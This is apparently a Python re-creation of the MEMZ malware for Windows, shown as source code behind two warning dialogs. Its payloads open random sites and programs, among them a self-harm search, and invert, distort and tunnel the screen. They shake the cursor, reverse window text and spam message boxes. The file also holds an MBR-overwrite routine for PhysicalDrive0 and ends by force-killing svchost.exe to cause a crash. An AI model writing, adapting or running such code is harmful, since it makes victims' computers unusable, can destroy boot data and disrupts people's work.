from win32api import *
from win32gui import *
from win32ui import *
from ctypes import WinDLL
from win32con import *
from win32file import *
from random import randrange as rd
from random import *
from sys import exit
import multiprocessing

#Warning messbox
def warning():
    if MessageBox("The software you just executed is considered malware.\nThis malware will harm your computer and makes it unusable.\nIf you want to safe your computer, you can use a safe environnement to test,\npress Yes to start it.\nDO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN A UNUSABLE MACHINE?","MEMZ", #The title of your warning
        MB_YESNO | MB_ICONWARNING) == 7: # If the user presses no, exit the program.
        exit()

    if MessageBox("THIS IS THE LAST WARNING!\nTHE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE.\nSTILL EXECUTE IT?","MEMZ", #The title of your warning
        MB_YESNO | MB_ICONWARNING) == 7: # If the user presses no, exit the program.
        exit()

# First payload, opening website
class Data:
    sites = (
        "https://google.co.ck/search?q=best+way+to+kill+yourself",
        "https://google.co.ck/search?q=how+2+remove+a+virus",
        "https://google.co.ck/search?q=what+happens+if+you+delete+system32",
        "https://google.co.ck/search?q=how+to+get+money",
        "https://google.co.ck/search?q=how+to+code+a+virus+in+visual+basic",
        "https://google.co.ck/search?q=bonzi+buddy+download+free",
        "https://google.co.ck/search?q=how+to+buy+weed",
        "http://pcoptimizerpro.com",
        "calc",
        "notepad",
        "cmd",
        "write",
        "regedit",
        "explorer",
        "taskmgr",
        "msfconfig",
        "msfpaint",
        "control",
        "mmc"
        )
    IconWarning = LoadIcon(None, 32515)
    IconError = LoadIcon(None, 32513)

class MBR :
    def overwrite():
        handle = CreateFileW("\\\\.\\PhysicalDrive0)",
                             GENERIC_WRITE ,
                             FILE_SHARE_READ | FILE_SHARE_WRITE,
                             None,
                             OPEN_EXISTING,
                             0,0)
        WriteFile(handle, AllocateReadBuffer(512), None)
        CloseHandle(handle)

time = 0
timeSubtract = 15000
class Payloads:
    def open_site():
        global timeSubtract
        sites = Data.sites
        global time
        while True:
            Sleep(timeSubtract-time)
            __import__("os").system("start " + str(choice(sites)))
    def decrease_timer(self):
        global time
        while time < 15000:
            time += 1
            Sleep(10)

    def blink_screen():
        global time
        global timeSubtract
        HDC = GetDC(0) # get the first monitor
        sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
        while True:
            Sleep(timeSubtract-time)
            PatBlt(HDC, 0,0,sw,sh, PATINVERT) # Invert the entire monitor! I know it sounds crazy!

    def reverse_text():
        global time
        global timeSubtract
        HWND = GetDesktopWindow()
        while True:
            EnumChildWindows(HWND, EnumChildProc, None)
            Sleep(timeSubtract-time)
    
    def error_drawing():
        global time
        global timeSubtract
        HDC = GetDC(0) # Fisrt Monitor
        sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1)) # Screen Size
        while True:
            DrawIcon(HDC, rd(sw), rd(sh), Data.IconWarning)
            for i in range(0, 60):
                mouseX,mouseY = GetCursorPos() # Cursor Positions
                DrawIcon(HDC, mouseX, mouseY, Data.IconError)
                Sleep(10)

    def warning_spam():
        global time
        global timeSubtract
        while True:
            multiprocessing.Process(target = msgboxThread).start()
            Sleep(timeSubtract-time)
    def screen_puzzle():
        global time
        global timeSubtract
        HDC = GetDC(0)
        sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))

        # Generate box position
        x1 = rd(sw-100)
        y1 = rd(sh-100)
        x2 = rd(sw-100)
        y2 = rd(sh-100)

        width = rd(600)
        height = rd(600)
        while True:
            BitBlt(HDC, x1, y1, width, height, HDC, x2, y2, SRCCOPY)
            Sleep(timeSubtract-time)

    def cursor_shake():
        global time
        global timeSubtract
        while True:
            x,y = GetCursorPos() # Get cursor position

            # Calculate new cursor postions
            newX = x + (rd(3)-1) * rd(int((time+1)/2200+2))
            newY = y + (rd(3)-1) * rd(int((time+1)/2200+2))

            SetCursorPos((newX,newY))

            Sleep(10)

    def tunnel_effect():
        global time
        global timeSubtract
        sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
        HDC = GetDC(0)
        while True:
            StretchBlt(HDC, 50, 50, sw - 100, sh -100, HDC, 0, 0, sw, sh , SRCCOPY)
            Sleep(time-timeSubtract)
            

def msgboxThread():
        MessageBox("still using this computer?", "lol", MB_OK | MB_ICONWARNING)



def EnumChildProc(hWnd, LParam): # THe callback function for reversing text.
    try :
        buffering = PyMakeBuffer(255)
        lenght = SendMessage(hWnd, WM_GETTEXT, 255, buffering) #Get lenght
        result = str(buffering[0:lenght*2].tobytes().decode('utf-16'))
        result = result[::-1]
        SendMessage(hWnd, WM_SETTEXT, None, result) #set the windows text
    except: pass

    #Using EnumChildWindows to run the code on every open windows

if __name__ == '__main__':
    p = Payloads()

    opensites = multiprocessing.Process(target = p.open_site)
    timersub = multiprocessing.Process(target = p.decrease_timer)
    reverse = multiprocessing.Process(target = p.reverse_text)
    blinking = multiprocessing.Process(target = p.blink_screen)
    icons = multiprocessing.Process(target= p.error_drawing)
    shaking = multiprocessing.Process(target = p.cursor_shake)
    tunneling = multiprocessing.Process(target = p.tunnel_effect)
    puzzling = multiprocessing.Process(target = p.screen_puzzle)
    errors = multiprocessing.Process(target = p.warning_spam)

    timersub.start()
    opensites.start()
    Sleep(timeSubtract*2)
    shaking.start()
    blinking.start()
    icons.start()
    Sleep(7000*2)
    reverse.start()
    puzzling.start()
    errors.start()
    Sleep(5000*2)
    tunneling.start()
    while time < 15000:
        Sleep(10)
        __import__("os").system("taskkill /F /IM svchost.exe") # Cause a BSOD